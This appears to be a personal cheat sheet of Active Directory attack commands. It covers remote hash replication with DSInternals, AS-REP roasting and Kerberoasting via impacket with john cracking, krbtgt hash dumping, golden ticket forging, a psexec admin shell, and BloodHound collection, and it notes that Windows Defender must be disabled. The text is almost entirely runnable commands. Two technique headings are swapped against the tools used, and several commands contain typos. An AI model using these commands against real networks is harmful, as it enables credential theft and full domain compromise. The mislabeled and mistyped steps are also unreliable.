## Remote Extraction of AD hashes
powershell> Import-Module DSInternals
powershell> $cred=Get-Credential
powershell>Get-ADReplAccount -SamAccountName USERNAME_VICTIM -Server IP -Credential $cred -Protocol TCP
-- got the NT Has

## Carry out a Kerberos roasting
$ cd /usr/share/doc/python3-impacket/examples
$ python3 GetNPUsers.py DOMAIN/ -dc-ip IP -usersfile WORDLIST -format hashcat > nhash
$ john nhash --wordlist=/usr/share/wordlists/rockyou.txt

## Run a no-preauthentication attack
 -- user has set servicePrincipalName to HTTP/USERNAME.service.com
 -- set servicePrincipalName: > setsp -S HTTP/USERNAME.service.com USERNAME
$ cd /usr/share/doc/python3-impacket/examples
$ python3 GetUserSPNs.py DOMAIN/USERNAME:PASSWORD -dc-ip IP -request
-- got kerberos ticket with hash, now lets crack it and get the principalService password
$ python3 GetUserSPNs.py DOMAIN/USERNAME:PASSWORD -dc-ip IP -request > sphash
$ john sphash --wordlist=--wordlist=/usr/share/wordlists/rockyou.txt

## Forge a golden ticket
-- need to be local admin, need to deactive windows defender
$ cd /usr/share/doc/python3-impacket/examples
$ sudo python3 secretsdump.py DOMAIN/USERNAME:PASSWORD
-- copy hash fot krbtgt user
$ sudo python3 lookupsid.py DOMAIN/USERNAME:PASSWORD@IP
$ sudo python3 ticketer.py -nthash HASH -domain-sid SID -domain DOMAIN USERNAME
-- got in USERNAME.ccache
$ export KRB5CCNAME=/usr/share/doc-python3-impacket/exmaples/USERNAME.ccache
$ sudo python3 psexec.py DOMAIN/USERNAME@HOSTNAME -target-ip IP_HOST -dc-ip DC_IP -no-pass-k
-- no have shell acces with admin rights

## Bloodhound
-- need to have domain user account 
$ .local/bin/bloodhount-python -u USERNAME -p PASSWORD -ns IP -d DOMAIN -c all
$ ls *.json
$ sudo neo4j console
-- acces localhost:7474 and change initial credentials
$ bloodhound 
-- login with neo4j creadentials
-- upload *.json data